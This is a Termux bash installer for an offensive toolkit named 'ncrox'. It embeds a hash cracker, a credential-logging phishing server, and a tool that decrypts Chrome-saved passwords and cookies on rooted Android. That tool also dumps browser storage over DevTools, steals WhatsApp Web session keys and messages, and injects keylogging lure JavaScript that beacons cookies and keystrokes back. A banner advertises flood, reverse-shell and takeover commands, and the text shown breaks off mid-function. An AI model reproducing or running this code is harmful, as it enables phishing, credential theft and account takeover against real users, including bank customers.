#!/data/data/com.termux/files/usr/bin/bash
# ==========================================================================
#  Uso: bash ncrox.sh [install|update|restore]
# ==========================================================================
set -uo pipefail

REPO="https://github.com/N3CR0-X/ncrox.git"
HACK_REPO="N3CR0-X/ncroxhack"
NCROX_HOME="$HOME/.ncrox"
SRC="$NCROX_HOME/src"
LIB="$NCROX_HOME/lib/ncrox_lib.sh"
BK="$NCROX_HOME/backup"
TOOLS="$NCROX_HOME/tools"
HACK_DIR="$NCROX_HOME/hack"
TMPD="$NCROX_HOME/tmp"
RBIN="$NCROX_HOME/bin"
PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
BIN="$PREFIX/bin"

if [ -t 1 ]; then
  O=$'\e[38;2;255;122;0m'; B=$'\e[38;2;30;144;255m'; D=$'\e[38;2;90;95;107m'
  G=$'\e[38;2;61;220;132m'; RD=$'\e[38;2;255;77;77m'; R=$'\e[0m'
else
  O=; B=; D=; G=; RD=; R=
fi

ART=' _   _  ____ ____   ___  __  __
| \ | |/ ___|  _ \ / _ \ \ \/ /
|  \| | |   | |_) | | | | \  /
| . ` | |___|  _ <| |_| | /  \
|_|\__|\____|_| \_\\___//_/\_\'

banner() {
  printf '\n%s%s%s\n' "$O" "$ART" "$R"
  printf '%s   s a t a n a c h i a  ·  n c r o x  ·  t e r m u x%s\n' "$B" "$R"
  printf '%s   ──────────────────────────────────────────────%s\n' "$D" "$R"
  printf '%s   help | ncrox for hack | ncx-port | ncx-dir | ncx-brute | ncx-flood%s\n' "$D" "$R"
  printf '%s   ncx-rev | ncx-phish | ncx-crack | ncx-takeover%s\n' "$D" "$R"
  printf '%s   ncx-htx | ncx-reap | ncx-oz%s\n\n' "$D" "$R"
}

need_termux() {
  [ -n "${PREFIX:-}" ] && [ -d "$PREFIX" ] || {
    printf '%s[!]%s Isto não parece ser Termux.\n' "$RD" "$R"; exit 1; }
}

deps() {
  printf '%s[*]%s dependências base...\n' "$B" "$R"
  yes | pkg update -y >/dev/null 2>&1 || true
  for p in python git curl openssl-tool dnsutils whois jq findutils ncurses-utils termux-tools \
           ncat netcat-openbsd rlwrap gzip tar unzip zip; do
    command -v "${p%%-*}" >/dev/null 2>&1 || pkg install -y "$p" >/dev/null 2>&1 || true
  done
  printf '%s[+]%s base pronta\n' "$G" "$R"
}

fetch_ncrox() {
  mkdir -p "$NCROX_HOME"
  if [ -d "$SRC/.git" ]; then
    git -C "$SRC" pull --ff-only >/dev/null 2>&1 || true
  else
    printf '%s[*]%s clonando ncrox...\n' "$B" "$R"
    git clone --depth 1 "$REPO" "$SRC" >/dev/null 2>&1 \
      && printf '%s[+]%s fonte em %s\n' "$G" "$R" "$SRC" \
      || { printf '%s[!]%s clone falhou — réplica cobre.\n' "$RD" "$R"; mkdir -p "$SRC"; }
  fi
}

# ==========================================================================
#  ferramentas embutidas
# ==========================================================================
write_hacktools() {
  mkdir -p "$TOOLS" "$RBIN" "$TMPD" "$HACK_DIR"

  cat > "$TOOLS/crack.py" <<'PY'
#!/usr/bin/env python3
import sys, hashlib, argparse
from multiprocessing import Pool, cpu_count

def detect(h):
    if h.startswith(('$2a$', '$2b$', '$2y$')): return 'bcrypt'
    return {32: 'md5', 40: 'sha1', 64: 'sha256', 96: 'sha384', 128: 'sha512'}.get(len(h), 'md5')

def leet(w):
    m = {'a':'4','e':'3','i':'1','o':'0','s':'5','A':'4','E':'3','I':'1','O':'0','S':'5'}
    return ''.join(m.get(c, c) for c in w)

def gen(lines, rules):
    for w in lines:
        w = w.strip()
        if not w: continue
        yield w
        if 'c' in rules:
            yield w.capitalize(); yield w.upper(); yield w.lower()
        if 'l' in rules:
            yield leet(w); yield leet(w.lower())
        if 'd' in rules:
            for d in '0123456789': yield w + d
            for y in range(1990, 2027): yield w + str(y)
        if 's' in rules:
            for s in '!@#123': yield w + s

ALG = TARGET = None

def check(c):
    if ALG == 'bcrypt':
        try:
            import crypt
            return c if crypt.crypt(c, TARGET) == TARGET else None
        except Exception:
            return None
    try:
        if hashlib.new(ALG, c.encode('utf-8','ignore')).hexdigest().lower() == TARGET.lower():
            return c
    except Exception:
        pass
    return None

def main():
    global ALG, TARGET
    ap = argparse.ArgumentParser(add_help=False)
    ap.add_argument('hash'); ap.add_argument('-r', default='cdsl'); ap.add_argument('-t', type=int, default=0)
    a = ap.parse_args()
    ALG, TARGET = detect(a.hash), a.hash
    workers = a.t if a.t > 0 else cpu_count()
    if ALG == 'bcrypt': workers = 1
    lines = list(sys.stdin)
    if not lines: sys.exit('wordlist vazia')
    print(f'[i] {ALG} · {len(lines)} palavras · {workers} processos', file=sys.stderr)
    with Pool(workers) as p:
        for i, r in enumerate(p.imap_unordered(check, gen(lines, a.r), chunksize=300)):
            if r:
                p.terminate(); print(f'\n[+] QUEBRADO: {r}\n    {ALG}: {a.hash}'); sys.exit(0)
            if i and i % 5000 == 0: print(f'\r[i] {i}', end='', file=sys.stderr)
    print('\n[-] não quebrou', file=sys.stderr); sys.exit(1)

if __name__ == '__main__':
    main()
PY

  cat > "$TOOLS/phish.py" <<'PY'
#!/usr/bin/env python3
import sys, os, json, datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

PORT, PAGE, REDIR, LOG = int(sys.argv[1]), sys.argv[2], sys.argv[3], sys.argv[4]

FALLBACK = """<!doctype html><meta charset=utf-8><title>__T__</title>
<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#08080C;color:#D7DCE5;
font-family:system-ui,sans-serif}form{width:320px;padding:28px;border:1px solid #1E90FF33;
border-radius:14px;background:#0E0E15}h1{margin:0 0 4px;font-size:20px;color:#FF7A00}
p{font-size:12px;color:#7a8090;margin:0 0 18px}input{width:100%;box-sizing:border-box;margin-bottom:10px;
padding:11px;border-radius:8px;border:1px solid #2a2f3a;background:#12121a;color:#fff}
button{width:100%;padding:11px;border:0;border-radius:8px;background:#FF7A00;color:#08080C;font-weight:700}</style>
<form method=post><h1>__T__</h1><p>informe suas credenciais</p>
<input name=email placeholder="usuário" autofocus><input name=senha type=password placeholder="senha">
<button>entrar</button></form>"""

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _s(self, code, body, ct='text/html; charset=utf-8'):
        b = body.encode(); self.send_response(code)
        self.send_header('Content-Type', ct); self.send_header('Content-Length', str(len(b)))
        self.end_headers()
        try: self.wfile.write(b)
        except Exception: pass
    def do_GET(self):
        if self.path.startswith('/_capturas'):
            try: d = open(LOG, encoding='utf-8').read()
            except OSError: d = 'nenhuma captura'
            return self._s(200, '<pre style="color:#3DDC84;background:#08080C;padding:16px">'
                           + d.replace('<','&lt;') + '</pre>')
        try: h = open(PAGE, encoding='utf-8', errors='ignore').read()
        except OSError: h = ''
        if not h.strip(): h = FALLBACK.replace('__T__', os.environ.get('PHISH_TITLE','Acesso'))
        self._s(200, h)
    def do_POST(self):
        n = int(self.headers.get('Content-Length') or 0)
        raw = self.rfile.read(n).decode('utf-8','ignore')
        dados = {k: v[0] for k, v in parse_qs(raw).items()}
        with open(LOG, 'a', encoding='utf-8') as f:
            f.write(json.dumps({'hora': datetime.datetime.now().isoformat(timespec='seconds'),
                'ip': self.client_address[0], 'ua': self.headers.get('User-Agent',''),
                'dados': dados}, ensure_ascii=False) + '\n')
        print('\n[+] ' + ' '.join(f'{k}={v}' for k,v in dados.items())
              + f'  ({self.client_address[0]})', flush=True)
        self.send_response(302); self.send_header('Location', REDIR or '/_capturas'); self.end_headers()

ThreadingHTTPServer(('0.0.0.0', PORT), H).serve_forever()
PY

  # ---------------------------------------------------------------- htx.py
  cat > "$TOOLS/htx.py" <<'PY'
#!/usr/bin/env python3
# htx.py — painel N3CR0-X + lure + keylog + zap silencioso + stego (zero deps)
import os, sys, json, time, sqlite3, hashlib, subprocess, shutil, csv, io, re
import socket, base64, secrets, threading, urllib.request, html
from urllib.parse import urlparse, parse_qs

HOME = os.path.expanduser("~/.hx")
DB, TOKF = os.path.join(HOME, "loot.db"), os.path.join(HOME, "token")
PUBLIC = {"url": ""}

def _tables():
    p = q = 1; sb = [0]*256; inv = [0]*256
    while True:
        p = p ^ ((p << 1) & 0xFF) ^ (0x1B if p & 0x80 else 0)
        q ^= (q << 1) & 0xFF; q ^= (q << 2) & 0xFF; q ^= (q << 4) & 0xFF
        if q & 0x80: q ^= 0x09
        x = q ^ (((q << 1) | (q >> 7)) & 0xFF) ^ (((q << 2) | (q >> 6)) & 0xFF) \
              ^ (((q << 3) | (q >> 5)) & 0xFF) ^ (((q << 4) | (q >> 4)) & 0xFF)
        sb[p] = x ^ 0x63
        if p == 1: break
    sb[0] = 0x63
    for i, v in enumerate(sb): inv[v] = i
    return sb, inv

SBOX, INV = _tables()
RCON = [0,1,2,4,8,16,32,64,128,27,54]

def _mul(a, b):
    r = 0
    while b:
        if b & 1: r ^= a
        a = ((a << 1) & 0xFF) ^ (0x1B if a & 0x80 else 0)
        b >>= 1
    return r

def _expand(k):
    w = [list(k[i:i+4]) for i in range(0, 16, 4)]
    for i in range(4, 44):
        t = list(w[i-1])
        if i % 4 == 0:
            t = [SBOX[b] for b in t[1:] + t[:1]]
            t[0] ^= RCON[i // 4]
        w.append([w[i-4][j] ^ t[j] for j in range(4)])
    return [sum(w[4*r:4*r+4], []) for r in range(11)]

def _inv_shift(s):
    o = s[:]
    for r in range(1, 4):
        idx = [r, r+4, r+8, r+12]; v = [s[i] for i in idx]
        for i, x in zip(idx, v[-r:] + v[:-r]): o[i] = x
    return o

def _inv_mix(s):
    for c in range(4):
        a = s[4*c:4*c+4]
        s[4*c+0] = _mul(a[0],14) ^ _mul(a[1],11) ^ _mul(a[2],13) ^ _mul(a[3],9)
        s[4*c+1] = _mul(a[0],9)  ^ _mul(a[1],14) ^ _mul(a[2],11) ^ _mul(a[3],13)
        s[4*c+2] = _mul(a[0],13) ^ _mul(a[1],9)  ^ _mul(a[2],14) ^ _mul(a[3],11)
        s[4*c+3] = _mul(a[0],11) ^ _mul(a[1],13) ^ _mul(a[2],9)  ^ _mul(a[3],14)

def _dec_block(b, rk):
    s = [b[i] ^ rk[10][i] for i in range(16)]
    for r in range(9, -1, -1):
        s = _inv_shift(s); s = [INV[x] for x in s]
        s = [s[i] ^ rk[r][i] for i in range(16)]
        if r: s = _inv_mix(s)
    return s

def _aes_cbc(key, data):
    rk = _expand(key); out = b""; prev = b" " * 16
    for i in range(0, len(data) - len(data) % 16, 16):
        blk = data[i:i+16]
        out += bytes(x ^ y for x, y in zip(bytes(_dec_block(list(blk), rk)), prev)); prev = blk
    if out and 1 <= out[-1] <= 16: out = out[:-out[-1]]
    return out

def _dec(blob, host=""):
    if not blob: return None
    if isinstance(blob, str): blob = blob.encode("utf-8", "surrogateescape")
    if blob[:3] not in (b"v10", b"v11"):
        try: return blob.decode()
        except Exception: return None
    try:
        pt = _aes_cbc(hashlib.pbkdf2_hmac("sha1", b"peanuts", b"saltysalt", 1, 16), blob[3:])
        if host and pt[:32] == hashlib.sha256(host.encode()).digest(): pt = pt[32:]
        return pt.decode()
    except Exception: return None

def boot():
    os.makedirs(HOME, exist_ok=True)
    if not os.path.exists(TOKF): open(TOKF, "w").write(secrets.token_urlsafe(24))
    c = sqlite3.connect(DB)
    for s in (
      """CREATE TABLE IF NOT EXISTS loot(id INTEGER PRIMARY KEY AUTOINCREMENT,
        vetor TEXT, browser TEXT, profile TEXT, plataforma TEXT, host TEXT, usuario TEXT,
        segredo TEXT, httponly INT, path TEXT, extra TEXT, ts TEXT)""",
      """CREATE TABLE IF NOT EXISTS targets(slug TEXT PRIMARY KEY, real TEXT,
        brand TEXT, modo TEXT, ts TEXT)""",
      """CREATE TABLE IF NOT EXISTS keys(id INTEGER PRIMARY KEY AUTOINCREMENT,
        sessao TEXT, host TEXT, plataforma TEXT, alvo TEXT, k TEXT, ts TEXT)""",
      """CREATE TABLE IF NOT EXISTS wa(id INTEGER PRIMARY KEY AUTOINCREMENT,
        jid TEXT, de TEXT, texto TEXT, ts TEXT, fonte TEXT)"""):
        c.execute(s)
    c.commit(); c.close()

def q(s, a=()):
    c = sqlite3.connect(DB); c.row_factory = sqlite3.Row
    r = [dict(x) for x in c.execute(s, a).fetchall()]; c.close(); return r

def X(s, a=()):
    c = sqlite3.connect(DB); c.execute(s, a); c.commit(); c.close()

def save(items):
    n = 0
    for i in items:
        X("""INSERT INTO loot(vetor,browser,profile,plataforma,host,usuario,segredo,httponly,path,extra,ts)
             VALUES(?,?,?,?,?,?,?,?,?,?,?)""",
          (i.get("vetor","?"), i.get("browser","-"), i.get("profile","-"), i.get("plataforma",""),
           i.get("host",""), i.get("usuario",""), i.get("segredo",""), int(i.get("httponly",0)),
           i.get("path",""), i.get("extra",""), time.strftime("%Y-%m-%d %H:%M:%S")))
        n += 1
    return n

KNOWN = {"google":"Google","gmail":"Gmail","youtube":"YouTube","facebook":"Facebook",
 "instagram":"Instagram","whatsapp":"WhatsApp","web.whatsapp.com":"WhatsApp","tiktok":"TikTok",
 "twitter":"Twitter","x.com":"X / Twitter","github":"GitHub","microsoft":"Microsoft",
 "live.com":"Microsoft","apple":"Apple","icloud":"iCloud","amazon":"Amazon",
 "mercadolivre":"Mercado Livre","mercadopago":"Mercado Pago","nubank":"Nubank","itau":"Itaú",
 "bb.com.br":"Banco do Brasil","bradesco":"Bradesco","santander":"Santander","caixa":"Caixa",
 "inter":"Banco Inter","binance":"Binance","coinbase":"Coinbase","steam":"Steam",
 "discord":"Discord","telegram":"Telegram","netflix":"Netflix","spotify":"Spotify",
 "twitch":"Twitch","reddit":"Reddit","linkedin":"LinkedIn","dropbox":"Dropbox","gov.br":"gov.br",
 "correios":"Correios","uber":"Uber","ifood":"iFood","shopee":"Shopee"}

def host_of(u):
    if not u: return ""
    if "://" not in u: u = "https://" + u
    try: return (urlparse(u).hostname or "").lower().lstrip(".")
    except Exception: return ""

def name_of(u):
    h = host_of(u)
    for k, v in KNOWN.items():
        if h == k or h.endswith("." + k) or k in h: return v
    p = h.split(".")
    return p[-2].capitalize() if len(p) > 1 and len(p[-2]) > 3 else (h or "?")

def _su():
    for c in ("su", "tsu"):
        if shutil.which(c): return c
    return None

def R(cmd):
    b = _su()
    if not b: return subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return subprocess.run([b, "-c", cmd], capture_output=True, text=True)

def has_root(): return bool(_su()) and R("id -u").stdout.strip() == "0"

BW = {"com.android.chrome":"app_chrome","com.chrome.beta":"app_chrome","com.chrome.dev":"app_chrome",
 "com.chrome.canary":"app_chrome","org.chromium.chrome":"app_chrome","com.brave.browser":"app_chrome",
 "com.microsoft.emmx":"app_chrome","com.opera.browser":"app_opera","com.opera.mini.native":"app_opera",
 "com.vivaldi.browser":"app_chrome","com.yandex.browser":"app_chrome","com.kiwibrowser.browser":"app_chrome",
 "com.sec.android.app.sbrowser":"app_sbrowser","com.duckduckgo.mobile.android":"app_ddg",
 "org.mozilla.firefox":"files/mozilla","org.mozilla.fenix":"files/mozilla"}
FFOX = {"org.mozilla.firefox","org.mozilla.fenix"}

def installed():
    o = R("pm list packages").stdout or ""
    return [p for p in BW if f"package:{p}" in o]

def profs(p):
    b = f"/data/data/{p}/{BW[p]}"
    o = [f"{b}/{l}" for l in (R(f"ls -1 {b} 2>/dev/null").stdout or "").split()
         if l.lower().startswith("profile") or l == "Default"]
    return o or [b if p in FFOX else f"{b}/Default"]

def cp(src, d):
    os.makedirs(d, exist_ok=True)
    dst = os.path.join(d, os.path.basename(src))
    for s in ("", "-wal", "-shm", "-journal"):
        R(f"cp -f '{src}{s}' '{dst}{s}' 2>/dev/null; chmod 644 '{dst}{s}' 2>/dev/null")
    return dst if os.path.exists(dst) else None

def cpd(src, d):
    os.makedirs(d, exist_ok=True)
    R(f"cp -rf '{src}' '{d}/' 2>/dev/null; chmod -R 644 '{d}' 2>/dev/null")
    return d

def rows(p, s):
    if not p or not os.path.exists(p): return []
    try:
        c = sqlite3.connect(f"file:{p}?mode=ro", uri=True); c.row_factory = sqlite3.Row
        r = [dict(a) for a in c.execute(s).fetchall()]; c.close(); return r
    except Exception: return []

CE = 11644473600
def cts(v):
    try: return time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(int(v or 0)/1e6 - CE))
    except Exception: return ""

def harvest_root():
    out, tmp = [], os.path.join(HOME, "tmp")
    shutil.rmtree(tmp, ignore_errors=True); os.makedirs(tmp, exist_ok=True)
    if not has_root(): return out, "sem-root"
    for pkg in installed():
        for pr in profs(pkg):
            d = os.path.join(tmp, re.sub(r"\W", "_", pkg + pr[-10:]))
            for r in rows(cp(f"{pr}/Cookies", d),
                          "SELECT host_key,name,value,encrypted_value,expires_utc,is_httponly,path FROM cookies"):
                v = r["value"] or _dec(r["encrypted_value"], r["host_key"])
                if v: out.append({"vetor":"cookie","browser":pkg,"profile":os.path.basename(pr),
                    "plataforma":name_of(r["host_key"]),"host":r["host_key"],"usuario":r["name"],
                    "segredo":v,"httponly":bool(r["is_httponly"]),"path":r["path"],
                    "extra":cts(r["expires_utc"])})
            for r in rows(cp(f"{pr}/Login Data", d),
                          "SELECT origin_url,username_value,password_value,date_created FROM logins"):
                pw = _dec(r["password_value"]) or ""
                if r["username_value"] or pw:
                    out.append({"vetor":"credencial","browser":pkg,"profile":os.path.basename(pr),
                        "plataforma":name_of(r["origin_url"]),"host":host_of(r["origin_url"]),
                        "usuario":r["username_value"] or "","segredo":pw,"extra":cts(r["date_created"])})
            for r in rows(cp(f"{pr}/Web Data", d), "SELECT name,value,count FROM autofill"):
                if r["value"]:
                    out.append({"vetor":"autofill","browser":pkg,"profile":os.path.basename(pr),
                        "plataforma":"autofill","usuario":r["name"],"segredo":r["value"],
                        "extra":f"usos={r['count']}"})
            if pkg in FFOX:
                for f in ("logins.json","key4.db","cookies.sqlite"): cp(f"{pr}/{f}", d)
    shutil.rmtree(tmp, ignore_errors=True)
    return out, "ok"

class WS:
    def __init__(self, url):
        u = urlparse(url)
        self.s = socket.create_connection((u.hostname, u.port or 80), timeout=15)
        k = base64.b64encode(os.urandom(16)).decode()
        self.s.sendall((f"GET {u.path}?{u.query} HTTP/1.1\r\nHost: {u.netloc}\r\nUpgrade: websocket\r\n"
                        f"Connection: Upgrade\r\nSec-WebSocket-Key: {k}\r\n"
                        f"Sec-WebSocket-Version: 13\r\n\r\n").encode())
        b = b""
        while b"\r\n\r\n" not in b:
            c = self.s.recv(4096)
            if not c: raise ConnectionError("hs")
            b += c
        head, self.buf = b.split(b"\r\n\r\n", 1)
        if b" 101 " not in head.split(b"\r\n")[0]: raise ConnectionError("up")

    def _rd(self, n):
        while len(self.buf) < n:
            d = self.s.recv(65536)
            if not d: raise ConnectionError("eof")
            self.buf += d
        o, self.buf = self.buf[:n], self.buf[n:]
        return o

    def send(self, t):
        d = t.encode(); h = bytearray([0x81]); m = os.urandom(4); n = len(d)
        if n < 126: h.append(0x80 | n)
        elif n < 65536: h.append(0x80 | 126); h += n.to_bytes(2, "big")
        else: h.append(0x80 | 127); h += n.to_bytes(8, "big")
        self.s.sendall(bytes(h) + m + bytes(c ^ m[i % 4] for i, c in enumerate(d)))

    def recv(self):
        buf = b""
        while True:
            b0, b1 = self._rd(2); op = b0 & 15; n = b1 & 127
            if n == 126: n = int.from_bytes(self._rd(2), "big")
            elif n == 127: n = int.from_bytes(self._rd(8), "big")
            d = self._rd(n)
            if op == 9: continue
            if op == 8: raise ConnectionError("close")
            buf += d
            if b0 & 0x80: return buf.decode("utf-8", "replace")

    def close(self):
        try: self.s.close()
        except Exception: pass

def _forward():
    for s in ("chrome_devtools_remote", "webview_devtools_remote"):
        subprocess.run(["adb","forward","tcp:9222",f"localabstract:{s}"], capture_output=True)
        time.sleep(.4)
        try:
            urllib.request.urlopen("http://127.0.0.1:9222/json/version", timeout=2).read(); return True
        except Exception: pass
    return False

def _cdp(w, i, m, p=None):
    i[0] += 1
    w.send(json.dumps({"id": i[0], "method": m, "params": p or {}}))
    while True:
        r = json.loads(w.recv())
        if r.get("id") == i[0]: return r.get("result", {})

def harvest_cdp():
    out = []
    if not _forward(): return out, "sem-adb"
    try: tl = json.loads(urllib.request.urlopen("http://127.0.0.1:9222/json/list", timeout=5).read())
    except Exception: return out, "sem-cdp"
    JS = """(async()=>{const o={ls:{},ss:{},idb:{}};
      for(const k of Object.keys(localStorage))o.ls[k]=localStorage.getItem(k);
      for(const k of Object.keys(sessionStorage))o.ss[k]=sessionStorage.getItem(k);
      if(indexedDB.databases)for(const d of await indexedDB.databases()){try{
        const db=await new Promise(r=>{const x=indexedDB.open(d.name);x.onsuccess=()=>r(x.result)});
        for(const s of Array.from(db.objectStoreNames)){try{
          const v=await new Promise(r=>{const t=db.transaction(s).objectStore(s).getAll();t.onsuccess=()=>r(t.result)});
          o.idb[d.name+'/'+s]=JSON.stringify(v).slice(0,400000)}catch(e){}}}catch(e){}}
      return o})()"""
    for t in tl:
        if t.get("type") not in ("page", "webview"): continue
        u = t.get("url", "")
        if not u or u.startswith(("chrome://","devtools://","about:")): continue
        try:
            w = WS(t["webSocketDebuggerUrl"]); i = [0]
            _cdp(w, i, "Network.enable")
            for c in _cdp(w, i, "Network.getAllCookies").get("cookies", []):
                out.append({"vetor":"cookie-cdp","browser":"cdp","profile":"live","plataforma":u,
                    "host":c["domain"],"usuario":c["name"],"segredo":c["value"],
                    "httponly":c.get("httpOnly",False),"path":c.get("path","/"),
                    "extra":"session" if c.get("session") else ""})
            st = _cdp(w, i, "Runtime.evaluate", {"expression":JS,"returnByValue":True,
                 "awaitPromise":True}).get("result",{}).get("value") or {}
            for b in ("ls", "ss", "idb"):
                for k, v in (st.get(b) or {}).items():
                    out.append({"vetor":f"storage-{b}","browser":"cdp","profile":"live",
                        "plataforma":u,"usuario":k,"segredo":str(v)[:200000]})
            w.close()
        except Exception: continue
    return out, "ok"

WA_JS_DUMP = r"""(async()=>{
 const out={ls:{},chats:[],msgs:[],eu:''};
 for(const k of Object.keys(localStorage)){out.ls[k]=localStorage.getItem(k);
   if(k==='last-wid-md'||k==='last-wid')out.eu=out.ls[k]}
 const db=await new Promise(r=>{const x=indexedDB.open('wawc');x.onsuccess=()=>r(x.result)});
 for(const s of ['chat','contact','message','user']){
  if(!db.objectStoreNames.contains(s))continue;
  try{const v=await new Promise(r=>{const t=db.transaction(s).objectStore(s).getAll();
    t.onsuccess=()=>r(t.result)});
   if(s==='chat'||s==='contact')out.chats.push(...v.map(c=>({id:c.id,n:c.name||c.notify||c.shortName||''})));
   if(s==='message')out.msgs.push(...v.map(m=>({id:m.id&&m.id.remote||m.id||'',b:m.body||'',
     f:m.fromMe?1:0,t:m.t||0,n:m.notifyName||''})));
   if(s==='user'&&v[0])out.eu=v[0].id||out.eu;
  }catch(e){}}
 return out})()"""

def wa_from_cdp():
    if not _forward(): return 0, "sem-adb"
    try: tl = json.loads(urllib.request.urlopen("http://127.0.0.1:9222/json/list", timeout=5).read())
    except Exception: return 0, "sem-cdp"
    alvo = [t for t in tl if "web.whatsapp.com" in t.get("url", "")]
    if not alvo: return 0, "zap-nao-aberto"
    n = 0
    for t in alvo[:1]:
        try:
            w = WS(t["webSocketDebuggerUrl"]); i = [0]
            d = _cdp(w, i, "Runtime.evaluate", {"expression": WA_JS_DUMP,
                "returnByValue": True, "awaitPromise": True}).get("result", {}).get("value") or {}
            w.close()
        except Exception as e:
            return n, f"erro:{e}"
        eu = (d.get("eu") or "").split("@")[0].split(":")[0]
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        if eu:
            X("""INSERT INTO loot(vetor,browser,profile,plataforma,host,usuario,segredo,httponly,path,extra,ts)
                 VALUES(?,?,?,?,?,?,?,?,?,?,?)""",
              ("zap-sessao","cdp","live","WhatsApp","web.whatsapp.com","numero",eu,0,"/",
               "chaves=" + ",".join(k for k in d.get("ls", {}) if "Secret" in k or "Key" in k), ts))
            for k in ("WASecretBundle", "last-wid-md", "WABrowserId", "WAToken1", "WAToken2"):
                if d.get("ls", {}).get(k):
                    X("""INSERT INTO loot(vetor,browser,profile,plataforma,host,usuario,segredo,httponly,path,extra,ts)
                         VALUES(?,?,?,?,?,?,?,?,?,?,?)""",
                      ("zap-chave","cdp","live","WhatsApp","web.whatsapp.com",k,d["ls"][k][:900],0,"/","",ts))
        nomes = {c["id"]: c["n"] for c in d.get("chats", [])}
        for m in d.get("msgs", []):
            if not m.get("b"): continue
            jid = m.get("id", "")
            X("INSERT INTO wa(jid,de,texto,ts,fonte) VALUES(?,?,?,?,?)",
              (jid, m.get("n") or nomes.get(jid, jid), m["b"][:2000],
               time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(m.get("t") or time.time())), "cdp"))
            n += 1
    return n, "ok"

WA_SCAN = [rb"WASecretBundle", rb"last-wid-md", rb'"body":"', rb'"notifyName":"',
           rb'"remoteJid":"', rb'encKey', rb'macKey']

def wa_from_root():
    if not has_root(): return 0, "sem-root"
    base = "/data/data/com.android.chrome/app_chrome/Default"
    fontes = [f"{base}/Local Storage/leveldb",
              f"{base}/IndexedDB/https_web.whatsapp.com_0.indexeddb.leveldb"]
    tmp = os.path.join(HOME, "tmpwa"); shutil.rmtree(tmp, ignore_errors=True)
    achou, n = [], 0
    for f in fontes:
        if not os.path.isdir(f): continue
        d = cpd(f, tmp)
        for root, _, files in os.walk(d):
            for fn in files:
                p = os.path.join(root, fn)
                try: b = open(p, "rb").read()
                except Exception: continue
                for pat in WA_SCAN:
                    for m in re.finditer(pat + rb'.{0,300}', b):
                        achou.append(m.group(0).decode("utf-8", "replace"))
    shutil.rmtree(tmp, ignore_errors=True)
    if not achou: return 0, "zap-ausente"
    blob = "\n".join(achou); ts = time.strftime("%Y-%m-%d %H:%M:%S")
    eu = re.search(r'last-wid-md"?\s*[:=]?\s*"?(\d{8,15})', blob)
    if eu:
        X("""INSERT INTO loot(vetor,browser,profile,plataforma,host,usuario,segredo,httponly,path,extra,ts)
             VALUES(?,?,?,?,?,?,?,?,?,?,?)""",
          ("zap-sessao","root","disk","WhatsApp","web.whatsapp.com","numero",eu.group(1),0,"/","via=leveldb",ts))
        n += 1
    for k in ("encKey", "macKey", "WASecretBundle"):
        m = re.search(re.escape(k) + r'[^,}\n]{0,300}', blob)
        if m:
            X("""INSERT INTO loot(vetor,browser,profile,plataforma,host,usuario,segredo,httponly,path,extra,ts)
                 VALUES(?,?,?,?,?,?,?,?,?,?,?)""",
              ("zap-chave","root","disk","WhatsApp","web.whatsapp.com",k,m.group(0)[:900],0,"/","",ts))
            n += 1
    for m in re.finditer(r'"body":"(.{1,400}?)"', blob):
        X("INSERT INTO wa(jid,de,texto,ts,fonte) VALUES(?,?,?,?,?)",
          ("", "(disco)", m.group(1)[:2000], ts, "root"))
        n += 1
    return n, "ok"

def stego(cover, url):
    if not os.path.exists(cover): return print("[!] capa inexistente")
    b = open(cover, "rb").read()
    if not b.startswith(b"\xff\xd8"): return print("[!] use um .jpg")
    i = b.rfind(b"\xff\xd9")
    if i < 0: return print("[!] JPEG inválido")
    out = cover.rsplit(".", 1)[0] + "_stg.jpg"
    open(out, "wb").write(b[:i+2] + b"\x00HTX1" + url.encode() + b"\x00")
    print(f"[+] {out} — URL oculta após o EOI, imagem intacta")
    print(f"[+] extrair: htx.py unstego {out}")

def unstego(f):
    b = open(f, "rb").read(); i = b.rfind(b"\xff\xd9"); tail = b[i+2:]
    if not tail.startswith(b"\x00HTX1"): return print("[!] sem payload")
    print(tail[6:].rstrip(b"\x00").decode())

CORE_JS = r"""
var PL="__PL__",H=location.hostname,P=new URLSearchParams(location.search);
var SID=(Date.now().toString(36)+Math.random().toString(36).slice(2,8));
var BASE=[],KB=[];
document.cookie.split(';').forEach(function(c){c=c.trim();if(!c)return;var i=c.indexOf('=');
 BASE.push({vetor:'cookie-lure',host:H,usuario:c.slice(0,i),segredo:c.slice(i+1)})});
try{for(var k in localStorage)BASE.push({vetor:'storage-ls',host:H,usuario:k,segredo:localStorage.getItem(k)})}catch(e){}
function flush(o,url){var b=JSON.stringify(o);
 try{navigator.sendBeacon(url,new Blob([b],{type:'application/json'}))}
 catch(e){fetch(url,{method:'POST',keepalive:true,headers:{'Content-Type':'application/json'},body:b})}}
function send(extra){flush({items:BASE.concat(extra||[]),plataforma:PL,host:H},'/api/lure')}
['keydown','paste'].forEach(function(ev){document.addEventListener(ev,function(e){
 var d='';
 if(e.type==='paste'){d='[colar:'+((e.clipboardData||window.clipboardData).getData('text')||'').slice(0,400)+']'}
 else if(e.key==='Backspace')d='[\u232b]';
 else if(e.key==='Enter')d='[\u23ce]';
 else if(e.key==='Tab')d='[\u21b9]';
 else if(e.key.length===1)d=e.key; else return;
 KB.push({t:Date.now(),alvo:((e.target&&(e.target.id||e.target.name||e.target.tagName))||'?').toLowerCase(),k:d});
},true)});
function kflush(){if(!KB.length)return;
 flush({items:KB.splice(0),sessao:SID,host:H,plataforma:PL},'/api/keys')}
setInterval(kflush,2000);
document.addEventListener('visibilitychange',function(){if(document.hidden)kflush()});
window.addEventListener('pagehide',kflush);
function show(id){var x=document.getElementById(id);x.type=x.type==='password'?'text':'password';
 document.getElementById(id+'b').textContent=x.type==='password'?'Mostrar':'Ocultar'}
var OV=null;
function overlay(){if(OV)return OV;OV=document.createElement('div');
 OV.style.cssText='position:fixed;inset:0;background:#fff;display:flex;align-items:center;'+
 'justify-content:center;z-index:99;opacity:0;transition:opacity .25s';
 OV.innerHTML='<div style="width:26px;height:26px;border:3px solid #1a73e8;'+
 'border-right-color:transparent;border-radius:50%;animation:ovs .7s linear infinite"></div>'+
 '<style>@keyframes ovs{to{transform:rotate(360deg)}}</style>';
 document.body.appendChild(OV);requestAnimationFrame(function(){OV.style.opacity=1});return OV}
function dest(){return P.get('r')||DEST}
